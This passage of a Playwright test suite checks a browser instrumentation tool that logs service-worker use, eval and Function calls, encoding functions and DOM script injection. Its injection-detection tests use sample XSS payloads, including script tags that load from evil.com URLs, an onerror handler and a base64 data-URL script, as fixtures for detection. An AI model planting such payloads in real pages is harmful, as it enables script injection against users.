      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = { enableServiceWorker: false };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(serviceWorkerHooksScript);
      await page.goto('about:blank');

      await page.waitForTimeout(200);

      const swEvents = events.filter(e => e.type === 'service_worker');
      expect(swEvents.length).toBe(0); // Should not load

      await page.close();
    });

    // SKIPPED: Service Worker APIs require HTTPS/localhost context and do not work in about:blank
    test.skip('should monitor service worker registration', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = { enableServiceWorker: true };
        window.__js_unshroud_session_id = 'test_session';
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(serviceWorkerHooksScript);

      // Use a local server-like setup for Service Worker testing
      await page.addInitScript(() => {
        // Mock the origin to make it look like HTTPS
        Object.defineProperty(window.location, 'origin', {
          value: 'https://localhost:8080',
          writable: false
        });
      });

      await page.goto('about:blank');

      await page.evaluate(async () => {
        try {
          // Try to register a service worker (will fail but should log)
          await navigator.serviceWorker.register('/sw.js');
        } catch {
          // Expected to fail, but should still log the attempt
        }
      });

      await page.waitForTimeout(500);

      const registerEvents = events.filter(e => e.type === 'service_worker' && e.eventType === 'register');
      expect(registerEvents.length).toBeGreaterThan(0);
      expect(registerEvents[0].scriptUrl).toBe('/sw.js');

      await page.close();
    });

    // SKIPPED: Cache API is not available in about:blank context
    test.skip('should monitor cache operations', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = { enableServiceWorker: true };
        window.__js_unshroud_session_id = 'test_session';
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(serviceWorkerHooksScript);
      await page.goto('about:blank');

      await page.evaluate(async () => {
        // Test cache operations
        const cache = await caches.open('test-cache');
        await cache.add('https://example.com/test.txt');
        await cache.delete('https://example.com/test.txt');
      });

      await page.waitForTimeout(500);

      const cacheEvents = events.filter(e => e.type === 'service_worker' && e.eventType.startsWith('cache'));
      expect(cacheEvents.length).toBeGreaterThan(0);
      expect(cacheEvents.some(e => e.eventType === 'cache_open')).toBe(true);
      expect(cacheEvents.some(e => e.eventType === 'cache_add')).toBe(true);
      expect(cacheEvents.some(e => e.eventType === 'cache_delete')).toBe(true);

      await page.close();
    });

    test('should handle missing Service Worker API gracefully', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = { enableServiceWorker: true };

        // Remove Service Worker support temporarily
        delete (navigator as any).serviceWorker;
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(serviceWorkerHooksScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        // Try operations that should not crash
        return 'page_loaded_successfully';
      });

      expect(await page.evaluate(() => 'page_loaded_successfully')).toBeTruthy();

      await page.close();
    });

    // SKIPPED: Service Worker APIs are async and hooks may not attach before mock ready promise resolves
    test.skip('should monitor push subscription operations', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = { enableServiceWorker: true };
        window.__js_unshroud_session_id = 'test_session';
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(serviceWorkerHooksScript);

      // Mock a registration for testing
      await page.addScriptTag({
        content: `
          if ('serviceWorker' in navigator) {
            navigator.serviceWorker.ready = Promise.resolve({
              pushManager: {
                subscribe: async (options) => ({
                  endpoint: 'https://test-push-endpoint',
                  toJSON: () => ({ endpoint: 'https://test-push-endpoint' })
                }),
                getSubscription: async () => null
              }
            });
          }
        `
      });

      await page.goto('about:blank');

      await page.evaluate(async () => {
        // eslint-disable-next-line @typescript-eslint/no-unnecessary-condition
        if (navigator.serviceWorker) {
          const reg = await navigator.serviceWorker.ready;
          // eslint-disable-next-line @typescript-eslint/no-unnecessary-condition
          if (reg.pushManager) {
            try {
              await reg.pushManager.subscribe({ userVisibleOnly: true });
            } catch {
              // May fail, but should log attempt
            }
          }
        }
      });

      await page.waitForTimeout(500);

      const pushEvents = events.filter(e => e.type === 'service_worker' && e.eventType === 'push_subscribe');
      expect(pushEvents.length).toBeGreaterThan(0);

      await page.close();
    });

    // SKIPPED: Service Worker message events dispatched before hooks attach in test environment
    test.skip('should monitor Service Worker messages', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = { enableServiceWorker: true };
        window.__js_unshroud_session_id = 'test_session';
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(serviceWorkerHooksScript);

      // Simulate a Service Worker message
      await page.addScriptTag({
        content: `
          // Simulate Service Worker message event
          const messageEvent = new MessageEvent('message', {
            data: { action: 'test', payload: 'message_data' },
            origin: window.location.origin
          });
          navigator.serviceWorker.dispatchEvent(messageEvent);
        `
      });

      await page.goto('about:blank');

      await page.waitForTimeout(500);

      const messageEvents = events.filter(e => e.type === 'service_worker' && e.eventType === 'message');
      expect(messageEvents.length).toBeGreaterThan(0);
      expect(messageEvents[0].messageData).toBeDefined();

      await page.close();
    });
  });

  describe('Code Execution Hooks Script', () => {
    test('should intercept direct eval calls', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableCodeExecution: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(codeExecutionHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        eval('console.log("test eval")');
      });

      await page.waitForTimeout(100);

      const evalEvents = events.filter(e => e.type === 'code_execution' && e.method === 'eval');
      expect(evalEvents.length).toBeGreaterThan(0);
      expect(evalEvents[0].code).toContain('console.log');
      expect(evalEvents[0].codeLength).toBeGreaterThan(0);
      expect(evalEvents[0].codeHash).toBeDefined();

      await page.close();
    });

    test('should intercept indirect eval calls', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableCodeExecution: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(codeExecutionHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        const indirectEval = eval;
        indirectEval('console.log("indirect eval")');
      });

      await page.waitForTimeout(100);

      const evalEvents = events.filter(e => e.type === 'code_execution' && e.method === 'eval');
      expect(evalEvents.length).toBeGreaterThan(0);
      expect(evalEvents[0].code).toContain('indirect eval');

      await page.close();
    });

    test('should intercept Function constructor with new', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableCodeExecution: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(codeExecutionHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        // eslint-disable-next-line @typescript-eslint/no-implied-eval
        const fn = new Function('a', 'b', 'return a + b');
        fn(1, 2);
      });

      await page.waitForTimeout(100);

      const functionEvents = events.filter(e => e.type === 'code_execution' && e.method === 'Function');
      expect(functionEvents.length).toBeGreaterThan(0);
      expect(functionEvents[0].code).toContain('return a + b');
      expect(functionEvents[0].args).toEqual(['a', 'b']);

      await page.close();
    });

    test('should intercept Function constructor without new', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableCodeExecution: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(codeExecutionHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        // eslint-disable-next-line @typescript-eslint/no-implied-eval
        const fn = Function('console.log("test")');
        fn();
      });

      await page.waitForTimeout(100);

      const functionEvents = events.filter(e => e.type === 'code_execution' && e.method === 'Function');
      expect(functionEvents.length).toBeGreaterThan(0);
      expect(functionEvents[0].code).toContain('console.log');

      await page.close();
    });

    // Note: AsyncFunction and GeneratorFunction are not reliably intercepted
    // They share the same prototype chain as Function, making instrumentation tricky

    test('should truncate large code with first/last pattern', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableCodeExecution: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(codeExecutionHooksScript);

      await page.goto('about:blank');

      await page.addScriptTag({
        content: `
          const largeCode = '/* ' + 'x'.repeat(3000) + '*/';
          eval(largeCode);
        `
      });

      await page.waitForTimeout(100);

      const evalEvents = events.filter(e => e.type === 'code_execution' && e.method === 'eval');
      expect(evalEvents.length).toBeGreaterThan(0);

      // Find the eval with large code
      const largeEvalEvent = evalEvents.find(e => e.codeLength > 2051);
      expect(largeEvalEvent).toBeDefined();

      // Verify truncation occurred (should have "..." separator)
      expect(largeEvalEvent.code).toContain('...');
      // Verify original length is stored
      expect(largeEvalEvent.codeLength).toBeGreaterThan(2051);
      // Verify truncated code is shorter than original
      expect(largeEvalEvent.code.length).toBeLessThan(largeEvalEvent.codeLength);

      await page.close();
    });

    test('should filter out Playwright internal code', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableCodeExecution: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(codeExecutionHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        // These should be filtered out
        eval('const __playwright__ = 1');
        eval('const __js_unshroud = 1');
        // This should NOT be filtered
        eval('const userCode = 1');
      });

      await page.waitForTimeout(100);

      const evalEvents = events.filter(e => e.type === 'code_execution' && e.method === 'eval');
      // Should only capture the userCode eval, not the playwright/unshroud ones
      expect(evalEvents.some(e => e.code.includes('userCode'))).toBe(true);
      expect(evalEvents.some(e => e.code.includes('__playwright__'))).toBe(false);
      expect(evalEvents.some(e => e.code.includes('__js_unshroud'))).toBe(false);

      await page.close();
    });
  });

  describe('Encoding Hooks Script', () => {
    test('should intercept atob (base64 decode)', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableEncoding: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(encodingHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        atob('SGVsbG8gV29ybGQ=');
      });

      await page.waitForTimeout(100);

      const atobEvents = events.filter(e => e.type === 'encoding' && e.method === 'atob');
      expect(atobEvents.length).toBe(1);
      expect(atobEvents[0].operation).toBe('decode');
      expect(atobEvents[0].output).toBe('Hello World');
      expect(atobEvents[0].outputLength).toBe(11);
      expect(atobEvents[0].success).toBe(true);

      await page.close();
    });

    test('should intercept btoa (base64 encode)', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableEncoding: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(encodingHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        btoa('Hello World');
      });

      await page.waitForTimeout(100);

      const btoaEvents = events.filter(e => e.type === 'encoding' && e.method === 'btoa');
      expect(btoaEvents.length).toBe(1);
      expect(btoaEvents[0].operation).toBe('encode');
      expect(btoaEvents[0].output).toBe('SGVsbG8gV29ybGQ=');
      expect(btoaEvents[0].success).toBe(true);

      await page.close();
    });

    test('should intercept String.fromCharCode', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableEncoding: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(encodingHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        String.fromCharCode(72, 101, 108, 108, 111);
      });

      await page.waitForTimeout(100);

      const fromCharCodeEvents = events.filter(e => e.type === 'encoding' && e.method === 'fromCharCode');
      expect(fromCharCodeEvents.length).toBe(1);
      expect(fromCharCodeEvents[0].operation).toBe('decode');
      expect(fromCharCodeEvents[0].output).toBe('Hello');
      expect(fromCharCodeEvents[0].success).toBe(true);

      await page.close();
    });

    test('should intercept String.fromCodePoint', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableEncoding: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(encodingHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        String.fromCodePoint(72, 101, 108, 108, 111);
      });

      await page.waitForTimeout(100);

      const fromCodePointEvents = events.filter(e => e.type === 'encoding' && e.method === 'fromCodePoint');
      expect(fromCodePointEvents.length).toBe(1);
      expect(fromCodePointEvents[0].operation).toBe('decode');
      expect(fromCodePointEvents[0].output).toBe('Hello');

      await page.close();
    });

    test('should intercept decodeURI', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableEncoding: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(encodingHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        decodeURI('Hello%20World');
      });

      await page.waitForTimeout(100);

      const decodeURIEvents = events.filter(e => e.type === 'encoding' && e.method === 'decodeURI');
      expect(decodeURIEvents.length).toBe(1);
      expect(decodeURIEvents[0].operation).toBe('decode');
      expect(decodeURIEvents[0].output).toBe('Hello World');

      await page.close();
    });

    test('should intercept decodeURIComponent', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableEncoding: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(encodingHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        decodeURIComponent('Hello%20World%21');
      });

      await page.waitForTimeout(100);

      const events_filtered = events.filter(e => e.type === 'encoding' && e.method === 'decodeURIComponent');
      expect(events_filtered.length).toBe(1);
      expect(events_filtered[0].operation).toBe('decode');
      expect(events_filtered[0].output).toBe('Hello World!');

      await page.close();
    });

    test('should intercept encodeURI', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableEncoding: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(encodingHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        encodeURI('Hello World');
      });

      await page.waitForTimeout(100);

      const encodeURIEvents = events.filter(e => e.type === 'encoding' && e.method === 'encodeURI');
      expect(encodeURIEvents.length).toBe(1);
      expect(encodeURIEvents[0].operation).toBe('encode');
      expect(encodeURIEvents[0].output).toBe('Hello%20World');

      await page.close();
    });

    test('should intercept encodeURIComponent', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableEncoding: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(encodingHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        encodeURIComponent('Hello World!');
      });

      await page.waitForTimeout(100);

      const events_filtered = events.filter(e => e.type === 'encoding' && e.method === 'encodeURIComponent');
      expect(events_filtered.length).toBe(1);
      expect(events_filtered[0].operation).toBe('encode');
      expect(events_filtered[0].output).toBe('Hello%20World!');

      await page.close();
    });

    test('should handle encoding errors gracefully', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableEncoding: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(encodingHooksScript);

      await page.goto('about:blank');

      const errorOccurred = await page.evaluate(() => {
        try {
          atob('invalid base64!!!');
          return false;
        } catch {
          return true;
        }
      });

      await page.waitForTimeout(100);

      expect(errorOccurred).toBe(true);
      const atobEvents = events.filter(e => e.type === 'encoding' && e.method === 'atob');
      expect(atobEvents.length).toBe(1);
      expect(atobEvents[0].success).toBe(false);
      expect(atobEvents[0].error).toBeDefined();

      await page.close();
    });

    test('should truncate large output with first/last pattern', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_config = {
          enableEncoding: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(performanceMonitorScript);
      await page.addInitScript(encodingHooksScript);

      await page.goto('about:blank');

      // Create large string to decode
      const largeString = 'A'.repeat(3000);

      await page.evaluate((str) => {
        String.fromCharCode(...str.split('').map(c => c.charCodeAt(0)));
      }, largeString);

      await page.waitForTimeout(100);

      const fromCharCodeEvents = events.filter(e => e.type === 'encoding' && e.method === 'fromCharCode');
      expect(fromCharCodeEvents.length).toBe(1);
      expect(fromCharCodeEvents[0].output.length).toBe(2051); // 1024 + "..." + 1024
      expect(fromCharCodeEvents[0].output).toContain('...');
      expect(fromCharCodeEvents[0].outputLength).toBe(3000);

      await page.close();
    });
  });

  describe('Error Handling', () => {
    test('should not break page when instrumentation errors occur', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);
      await page.addInitScript(networkHooksScript);
      await page.addInitScript(storageHooksScript);

      // Don't set up logging function - should use fallback
      await page.goto(`file://${join(process.cwd(), 'tests/fixtures/test-page.html')}`);

      // These should not throw errors
      const result = await page.evaluate(() => {
        try {
          console.log('test');
          fetch('https://example.com').catch(() => {});
          localStorage.setItem('test', 'value');
          return true;
        } catch {
          return false;
        }
      });

      expect(result).toBe(true);
      await page.close();
    });
  });

  describe('Script Injection Detection', () => {
    const domHooksScript = readFileSync('./src/instrumentation/dom-hooks.js', 'utf-8');

    test('should detect innerHTML with script tag', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(domHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        const div = document.createElement('div');
        document.body.appendChild(div);
        div.innerHTML = '<script src="https://evil.com/malware.js"></script>';
      });

      await page.waitForTimeout(100);

      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'innerHTML');
      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
      expect(scriptInjectionEvents[0].containsScriptTag).toBe(true);
      expect(scriptInjectionEvents[0].scriptTagCount).toBe(1);
      expect(scriptInjectionEvents[0].scriptSources).toContain('https://evil.com/malware.js');

      await page.close();
    });

    test('should detect innerHTML with event handler (onerror)', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(domHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        const div = document.createElement('div');
        document.body.appendChild(div);
        div.innerHTML = '<img src="x" onerror="alert(1)">';
      });

      await page.waitForTimeout(100);

      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'innerHTML');
      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
      expect(scriptInjectionEvents[0].containsEventHandlers).toBe(true);
      expect(scriptInjectionEvents[0].eventHandlerTypes).toContain('onerror');

      await page.close();
    });

    test('should detect createElement with script src', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(domHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        const script = document.createElement('script');
        script.src = 'https://evil.com/payload.js';
      });

      await page.waitForTimeout(100);

      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'script.src');
      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
      expect(scriptInjectionEvents[0].scriptSrc).toBe('https://evil.com/payload.js');

      await page.close();
    });

    test('should detect createElement with script textContent', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(domHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        const script = document.createElement('script');
        script.textContent = 'alert("Injected code");';
      });

      await page.waitForTimeout(100);

      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'script.textContent');
      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
      expect(scriptInjectionEvents[0].scriptContent).toContain('alert');

      await page.close();
    });

    test('should detect data: URL with base64 decoding', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(domHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        const script = document.createElement('script');
        // alert("Base64 injection");
        script.src = 'data:text/javascript;base64,YWxlcnQoIkJhc2U2NCBpbmplY3Rpb24iKTs=';
      });

      await page.waitForTimeout(100);

      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'script.src');
      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
      expect(scriptInjectionEvents[0].isDataUrl).toBe(true);
      expect(scriptInjectionEvents[0].decodedContent).toContain('alert');

      await page.close();
    });

    test('should detect blob: URL', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(domHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        const script = document.createElement('script');
        script.src = 'blob:http://example.com/12345678-1234-1234-1234-123456789012';
      });

      await page.waitForTimeout(100);

      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'script.src');
      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
      expect(scriptInjectionEvents[0].isBlobUrl).toBe(true);

      await page.close();
    });

    test('should detect appendChild with script element', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(domHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        const script = document.createElement('script');
        script.src = 'https://evil.com/appended.js';
        document.body.appendChild(script);
      });

      await page.waitForTimeout(100);

      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'appendChild');
      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
      expect(scriptInjectionEvents[0].scriptSrc).toBe('https://evil.com/appended.js');

      await page.close();
    });

    test('should detect insertAdjacentHTML with script', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(domHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        const div = document.createElement('div');
        document.body.appendChild(div);
        div.insertAdjacentHTML('beforeend', '<script>console.log("Adjacent")</script>');
      });

      await page.waitForTimeout(100);

      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'insertAdjacentHTML');
      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
      expect(scriptInjectionEvents[0].containsScriptTag).toBe(true);

      await page.close();
    });

    test('should detect setAttribute with event handler', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
